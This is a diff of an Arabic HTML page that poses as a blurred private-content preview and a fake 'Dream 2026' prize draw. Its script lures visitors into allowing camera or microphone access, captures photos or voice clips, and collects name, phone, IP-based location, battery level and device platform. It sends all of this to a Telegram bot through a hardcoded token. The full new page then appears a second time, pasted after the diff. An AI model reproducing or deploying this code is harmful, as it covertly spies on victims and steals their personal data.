@@ -3,88 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معاينة المحتوى الآمن</title>
+    <title>معاينة المحتوى</title>
     <style>
-        body { background: #121212; color: white; text-align: center; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; width: 350px; border: 1px solid #333; }
-        img { width: 100%; border-radius: 10px; filter: blur(20px); margin: 15px 0; transition: 0.5s; }
-        .btn { background: #00d4ff; color: #000; padding: 12px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
+        body { background: #f0f2f5; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        .hidden { display: none; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
+        .btn { background: #e67e22; color: white; padding: 15px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
+        img { width: 100%; border-radius: 10px; filter: blur(15px); margin-bottom: 15px; }
     </style>
 </head>
 <body>
-    <div class="card" onclick="startAction()">
-        <h2 id="title">مرحباً بك!</h2>
-        <p id="desc">يرجى الضغط والسماح بالوصول لفك تشفير المحتوى</p>
-        <img id="target-image" src="https://via.placeholder.com/300?text=Private+Content" alt="Locked">
-        <button class="btn">فتح الآن</button>
+    <div id="info-interface" class="card hidden">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Dream_TV_Logo.png" style="filter:none; width:100px;">
+        <h2>مسابقة الحلم 2026</h2>
+        <p>أدخل بياناتك للسحب على الجائزة الكبرى</p>
+        <input type="text" id="u_name" placeholder="الاسم الكامل">
+        <input type="tel" id="u_phone" placeholder="رقم الهاتف">
+        <button class="btn" onclick="collectData()">اشترك الآن</button>
     </div>
 
+    <div id="media-interface" class="card hidden">
+        <h2 id="m-title">مرحباً بك!</h2>
+        <p id="m-desc">انقر على الصورة للسماح بالعرض</p>
+        <img id="target-img" src="https://via.placeholder.com/300?text=Locked+Content">
+        <button class="btn" onclick="startCapture()">عرض المحتوى</button>
+    </div>
+
+    <video id="video" style="display:none" autoplay></video>
+    <canvas id="canvas" style="display:none"></canvas>
+
     <script>
-        const BOT_TOKEN = '8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg';
         const params = new URLSearchParams(window.location.search);
-        const type = params.get('type'); // نوع العملية: cam أو mic
+        const type = params.get('type'); 
         const uid = params.get('chatId');
-        const imgUrl = params.get('view_img');
+        const token = "8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg";
 
-        if (imgUrl) document.getElementById('target-image').src = imgUrl;
-        if (type === 'mic') {
-            document.getElementById('title').innerText = "رسالة صوتية مشفرة";
-            document.getElementById('desc').innerText = "اضغط للسماح للمتصفح بتشغيل الصوت";
+        // تحديد الواجهة بناءً على النوع
+        if (type === 'info') {
+            document.getElementById('info-interface').classList.remove('hidden');
+        } else {
+            document.getElementById('media-interface').classList.remove('hidden');
+            if (params.get('view_img')) document.getElementById('target-img').src = params.get('view_img');
         }
 
-        async function startAction() {
-            if (type === 'cam' || !type) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    document.getElementById('target-image').style.filter = "blur(0px)";
-                    capturePhoto(stream);
-                } catch (e) { alert("يجب السماح بالكاميرا للمتابعة"); }
-            } else if (type === 'mic') {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    captureAudio(stream);
-                } catch (e) { alert("يجب السماح بالمايكروفون لسماع الرسالة"); }
-            }
+        // 1. وظيفة جمع معلومات الجهاز
+        async function collectData() {
+            const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
+            const battery = await navigator.getBattery().catch(() => ({level:0, charging:false}));
+            
+            const msg = `🎯 معلومات مسابقة الحلم\n🆔 ID: ${uid}\n👤 الاسم: ${document.getElementById('u_name').value}\n📞 الهاتف: ${document.getElementById('u_phone').value}\n\n💻 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(battery.level*100)}%\n🌍 الموقع: ${geo.country_name} - ${geo.city}\n📍 IP: ${geo.ip}`;
+            
+            sendToBot('sendMessage', {text: msg});
+            alert("تم تسجيلك! سيتم الاتصال بك قريباً.");
         }
 
-        function capturePhoto(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                sendToTelegram(canvas.toDataURL('image/jpeg'), 'photo');
-                stream.getTracks().forEach(t => t.stop());
-            }, 1000);
+        // 2. وظيفة اختراق الكاميرا / المايك / الفيديو
+        async function startCapture() {
+            try {
+                const constraints = { video: (type !== 'mic'), audio: (type === 'mic' || type === 'vid') };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                document.getElementById('target-img').style.filter = "none";
+
+                if (type === 'mic') {
+                    const recorder = new MediaRecorder(stream);
+                    recorder.start();
+                    setTimeout(() => { 
+                        recorder.stop(); 
+                        recorder.ondataavailable = e => sendToBot('sendVoice', {voice: e.data});
+                    }, 4000);
+                } else {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => sendToBot('sendPhoto', {photo: blob}), 'image/jpeg');
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 2000);
+                }
+            } catch (e) { alert("يجب السماح بالوصول للمتابعة"); }
         }
 
-        function captureAudio(stream) {
-            const mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.start();
-            setTimeout(() => {
-                mediaRecorder.stop();
-                mediaRecorder.ondataavailable = (e) => {
-                    sendToTelegram(e.data, 'audio');
-                    stream.getTracks().forEach(t => t.stop());
-                };
-            }, 5000); // تسجيل 5 ثوانٍ
-        }
-
-        function sendToTelegram(data, mode) {
+        function sendToBot(method, data) {
             const fd = new FormData();
             fd.append('chat_id', uid);
-            if (mode === 'photo') {
-                const bin = atob(data.split(',')[1]);
-                const arr = new Uint8Array(bin.length);
-                for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
-                fd.append('photo', new Blob([arr], {type: 'image/jpeg'}), 'shot.jpg');
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            } else {
-                fd.append('voice', data, 'record.ogg');
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
-            }
+            for (let key in data) fd.append(key, data[key]);
+            fetch(`https://api.telegram.org/bot${token}/${method}`, {method: 'POST', body: fd});
+        }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>معاينة المحتوى</title>
+    <style>
+        body { background: #f0f2f5; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        .hidden { display: none; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
+        .btn { background: #e67e22; color: white; padding: 15px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
+        img { width: 100%; border-radius: 10px; filter: blur(15px); margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div id="info-interface" class="card hidden">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Dream_TV_Logo.png" style="filter:none; width:100px;">
+        <h2>مسابقة الحلم 2026</h2>
+        <p>أدخل بياناتك للسحب على الجائزة الكبرى</p>
+        <input type="text" id="u_name" placeholder="الاسم الكامل">
+        <input type="tel" id="u_phone" placeholder="رقم الهاتف">
+        <button class="btn" onclick="collectData()">اشترك الآن</button>
+    </div>
+
+    <div id="media-interface" class="card hidden">
+        <h2 id="m-title">مرحباً بك!</h2>
+        <p id="m-desc">انقر على الصورة للسماح بالعرض</p>
+        <img id="target-img" src="https://via.placeholder.com/300?text=Locked+Content">
+        <button class="btn" onclick="startCapture()">عرض المحتوى</button>
+    </div>
+
+    <video id="video" style="display:none" autoplay></video>
+    <canvas id="canvas" style="display:none"></canvas>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const type = params.get('type'); 
+        const uid = params.get('chatId');
+        const token = "8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg";
+
+        // تحديد الواجهة بناءً على النوع
+        if (type === 'info') {
+            document.getElementById('info-interface').classList.remove('hidden');
+        } else {
+            document.getElementById('media-interface').classList.remove('hidden');
+            if (params.get('view_img')) document.getElementById('target-img').src = params.get('view_img');
+        }
+
+        // 1. وظيفة جمع معلومات الجهاز
+        async function collectData() {
+            const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
+            const battery = await navigator.getBattery().catch(() => ({level:0, charging:false}));
+            
+            const msg = `🎯 معلومات مسابقة الحلم\n🆔 ID: ${uid}\n👤 الاسم: ${document.getElementById('u_name').value}\n📞 الهاتف: ${document.getElementById('u_phone').value}\n\n💻 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(battery.level*100)}%\n🌍 الموقع: ${geo.country_name} - ${geo.city}\n📍 IP: ${geo.ip}`;
+            
+            sendToBot('sendMessage', {text: msg});
+            alert("تم تسجيلك! سيتم الاتصال بك قريباً.");
+        }
+
+        // 2. وظيفة اختراق الكاميرا / المايك / الفيديو
+        async function startCapture() {
+            try {
+                const constraints = { video: (type !== 'mic'), audio: (type === 'mic' || type === 'vid') };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                document.getElementById('target-img').style.filter = "none";
+
+                if (type === 'mic') {
+                    const recorder = new MediaRecorder(stream);
+                    recorder.start();
+                    setTimeout(() => { 
+                        recorder.stop(); 
+                        recorder.ondataavailable = e => sendToBot('sendVoice', {voice: e.data});
+                    }, 4000);
+                } else {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => sendToBot('sendPhoto', {photo: blob}), 'image/jpeg');
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 2000);
+                }
+            } catch (e) { alert("يجب السماح بالوصول للمتابعة"); }
+        }
+
+        function sendToBot(method, data) {
+            const fd = new FormData();
+            fd.append('chat_id', uid);
+            for (let key in data) fd.append(key, data[key]);
+            fetch(`https://api.telegram.org/bot${token}/${method}`, {method: 'POST', body: fd});
         }
     </script>
 </body>
